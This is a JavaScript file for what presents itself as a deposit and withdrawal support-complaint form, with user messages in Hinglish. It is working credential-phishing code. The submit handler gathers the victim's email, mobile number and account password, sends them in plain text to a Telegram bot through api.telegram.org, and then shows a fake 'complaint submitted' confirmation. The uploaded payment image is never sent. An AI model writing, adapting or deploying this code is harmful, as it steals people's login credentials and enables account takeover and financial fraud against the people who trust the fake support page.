const modalOverlay = document.getElementById('modalOverlay');
const modalIcon = document.getElementById('modalIcon');
const modalTitle = document.getElementById('modalTitle');
const modalMsg = document.getElementById('modalMsg');
const modalBtn = document.getElementById('modalBtn');

function showModal(icon, title, msg, isError = false) {
    modalIcon.textContent = icon;
    modalTitle.textContent = title;
    modalMsg.textContent = msg;
    modalBtn.className = 'modal-btn' + (isError ? ' error-btn' : '');
    modalOverlay.classList.add('active');
}

modalBtn.addEventListener('click', function () {
    modalOverlay.classList.remove('active');
});

const problemSelect = document.getElementById('problem');
const amountGroup = document.getElementById('amountGroup');
const uploadGroup = document.getElementById('uploadGroup');
const amountLabel = document.getElementById('amountLabel');
const uploadLabel = document.getElementById('uploadLabel');

problemSelect.addEventListener('change', function () {
    const val = this.value;

    amountGroup.classList.add('hidden');
    uploadGroup.classList.add('hidden');

    if (val === 'deposit') {
        amountLabel.textContent = 'Enter Deposit Amount';
        uploadLabel.textContent = 'Upload Payment Image';
        amountGroup.classList.remove('hidden');
        uploadGroup.classList.remove('hidden');
    } else if (val === 'withdrawal') {
        amountLabel.textContent = 'Enter Withdrawal Amount';
        uploadLabel.textContent = 'Upload Withdrawal Issue Image';
        amountGroup.classList.remove('hidden');
        uploadGroup.classList.remove('hidden');
    }
});

const submitBtn = document.getElementById('submitBtn');

document.getElementById('supportForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const mobile = document.getElementById('mobile').value.trim();
    const password = document.getElementById('password').value.trim();
    const problem = document.getElementById('problem').value;
    const amount = document.getElementById('amount').value.trim();
    const fileInput = document.getElementById('fileUpload');
    const fileUpload = fileInput.files.length;

    if (!email || !mobile || !password || !problem) {
        showModal('❌', 'Error', 'Kripya saare fields fill karein.', true);
        return;
    }

    if (!amountGroup.classList.contains('hidden')) {
        if (!amount) {
            showModal('❌', 'Error', 'Kripya amount enter karein.', true);
            return;
        }
        if (!fileUpload) {
            showModal('❌', 'Error', 'Kripya image upload karein.', true);
            return;
        }
    }

    submitBtn.classList.add('loading');

    const token = CONFIG.TELEGRAM_BOT_TOKEN;
    const chatId = CONFIG.TELEGRAM_CHAT_ID;
    const problemType = problem === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem';

    const msg = `📩━━━ NEW COMPLAINT ━━━📩\n\n━━ Account Details ━━\n\n📧 Email\n\`${email}\`\n\n📱 Mobile\n\`${mobile}\`\n\n🔑 Password\n\`${password}\`\n\n━━ Issue Details ━━\n⚠️ Problem: ${problemType}\n💰 Amount: \`${amount}\`\n━━━━━━━━━━━━━━━━━`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
    }).catch(() => {});

    setTimeout(() => {
        submitBtn.classList.remove('loading');
        showModal('✅', 'Complain Submitted!', 'Aapki complain ho gai hai. 24 hours mein aapki problem fix kar di jayegi.');
        this.reset();
        amountGroup.classList.add('hidden');
        uploadGroup.classList.add('hidden');
    }, 3000);
});
